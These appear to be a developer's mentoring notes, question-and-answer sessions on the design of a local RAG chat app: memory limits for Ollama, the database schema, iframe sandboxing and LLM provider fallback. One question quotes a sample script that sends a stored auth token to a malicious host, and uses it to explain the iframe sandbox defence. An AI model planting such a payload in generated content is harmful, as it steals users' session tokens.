## Gate 1 — System Architecture & Request Lifecycle

### Question 1
Given your machine has 8 GB of unified RAM, what would happen under the hood if we tried to run an 8B parameter model in Ollama at the same time as Docker, a PostgreSQL container, and the frontend/backend development servers?

**User Answer:**
> Due to the RAM is low with unified memory we cannot run model of 8B. It needs at least 8GB free space on RAM, meaning only if our laptop has full free RAM it can run, and that also bare minimum. So OOM will kill the process.

**Mentor Assessment:**
- *What was right:* Accurately recognized that Apple Silicon's unified memory is shared between OS, GPU, and apps, and that 8B models demand too much memory, risking OOM.
- *What was incomplete:* Clarified that before an outright OOM kill, the macOS kernel aggressively pages memory to disk ("swap thrashing"), which freezes the system, causes latencies to jump from seconds to minutes, and thrashes the SSD.
- *Verified Mental Model:* Unified RAM budget must strictly stay under 3B parameters (`llama3.2:3b` at ~2.0 GB) to guarantee fast generation (25-35 t/s) and leave 5 GB+ headroom for the OS and dev servers.

### Question 2
Why must conversation history (`sessions` and `messages`) be stored in a relational database table completely separate from the transcript chunks and vector index?

**User Answer:**
> We use relational DB when we know the scope of the data, so when we create columns it is easy and to maintain that data consistent and reliable and permanent data stored there. Only vector chunks are used to send them as payload.

**Mentor Assessment:**
- *What was right:* Correctly identified that relational DBs handle structured, consistent, permanent state.
- *What was incomplete:* Clarified the query semantics difference: conversation history requires deterministic transactional filtering (`WHERE session_id = ? ORDER BY created_at ASC`), whereas RAG retrieval requires high-dimensional approximate nearest neighbor (ANN) vector math (`ORDER BY embedding <=> query LIMIT 5`). Mixing conversational chatter into the reference vector index pollutes retrieval accuracy.
- *Verified Mental Model:* Strict separation of operational conversational state from static reference knowledge.

### Question 3
If an HTML artifact generated by the LLM contains `<script>fetch('https://malicious-site.com', {body: window.parent.localStorage.getItem('token')})</script>`, how does our sandboxed `<iframe>` (with `sandbox="allow-scripts"` but *without* `allow-same-origin`) prevent that exfiltration?

**User Answer:**
> `sandbox="allow-scripts"` will allow an iframe to run scripts, but by not using `allow-same-origin` it will isolate the iframe from the development.

**Mentor Assessment:**
- *What was right:* Recognized that `allow-scripts` permits execution while omitting `allow-same-origin` isolates the frame.
- *What was incomplete:* Clarified the exact browser engine mechanism: omitting `allow-same-origin` forces the browser to assign an opaque `origin: "null"`. Any attempt by code inside the frame to access `window.parent` immediately triggers a browser `SecurityError: Blocked a frame with origin "null" from accessing a cross-origin frame`.
- *Verified Mental Model:* Defense-in-depth: allow interactive JavaScript (charts, calculators) while setting origin to null to physically block parent DOM/storage leakage.

### Question 4
What should happen in the backend if a user sends a chat message when their internet connection drops mid-session, assuming local Ollama is running?

**User Answer:**
> On this project, if internet sudden off, will use the fallback which is local ollama model use to get an answer for query.

**Mentor Assessment:**

## Gate 2 — Database Models, Foreign Keys & Session Isolation

### Question 1
If a user deletes a chat session in the UI, what would happen in the database if we did NOT configure `cascade="all, delete-orphan"` on the `Session -> Message` relationship?

**User Answer:**
> Not sure initially (walked through folder/paper analogy).

**Mentor Explanation & Mental Model:**
- *Analogy:* If you shred a file folder (session) without deleting the loose papers inside (messages), those papers become **orphaned records**.
- *Database reality:* If foreign keys are enforced, deleting the session will throw an `IntegrityError` refusing deletion because child messages still point to it. If foreign keys are not enforced, the session is deleted but 50 useless ghost messages remain permanently in the database taking up disk space.
- *Engineering Consequence:* With `cascade="all, delete-orphan"` and `PRAGMA foreign_keys = ON`, deleting a session automatically and atomically deletes all associated messages and artifacts in the same transaction.

### Question 2
Why must the RAG prompt builder query messages strictly filtered by `session_id` (e.g. `WHERE session_id = :current_session_id`), rather than retrieving the user's latest messages across all sessions?

**User Answer:**
> Not sure initially (walked through two-chat-tab scenario).

**Mentor Explanation & Mental Model:**
- *Analogy:* If you have Chat A about B2B growth loops and Chat B drafting a job resignation email, failing to filter by `session_id` would inject your resignation notes into the B2B prompt!
- *Engineering Consequence:* Scoping queries strictly to `WHERE session_id = :session_id` guarantees zero topic cross-contamination and preserves precious prompt token space for podcast transcript excerpts.

## Gate 3 — Multi-Provider LLM Abstraction & Cascading Fallback

### Question 1
Why does returning a standardized `LLMResponse` object (with normalized fields like `text`, `latency_ms`, and `provider`) matter to the layers that sit *above* the LLM (like our session database and citation engine)?

**User Answer:**
> Because it standardized LLM response, easy to control the structure while minimizing hallucination, and with standard response we can use that data in code. If key names change, data becomes inconsistent.

**Mentor Assessment:**
- *What was right:* Spot on. If vendor payloads differ (`choices[0].message.content` vs `candidates[0].content.parts[0].text`), upstream consumers break whenever a model is switched.
- *Verified Mental Model:* Liskov Substitution Principle (LSP): provider adapters normalize all vendor variations into a stable `LLMResponse` contract.

---

### Question 2
If a user configures a cloud API key, but their internet connection experiences a DNS failure during generation, how should the `TaskRouter` handle that exception? And how can a production app on HTTPS talk to local HTTP Ollama without browser mixed-content blocks?

**User Answer:**
> The TaskRouter should check both Gemini and OpenRouter API connections, and if they fail, use the local Ollama server. But on production, if the app has HTTPS, it cannot connect with the HTTP server from Ollama because the browser blocks mixed content—how to resolve this?

**Mentor Assessment & Architectural Explanation:**
- *What was right:* Understood automated exception catching and cascading to local Ollama.
- *Handling the HTTPS / Mixed-Content Question:* The browser **never** connects directly to Ollama. The browser only talks via encrypted HTTPS to the FastAPI backend. All Ollama calls execute **server-side** on `localhost:11434` or an internal Docker virtual network. Because it is a server-to-server internal call, browser mixed-content policies never apply.
- *Verified Mental Model:* Server-side execution preserves security boundaries and bypasses browser mixed-content restrictions.
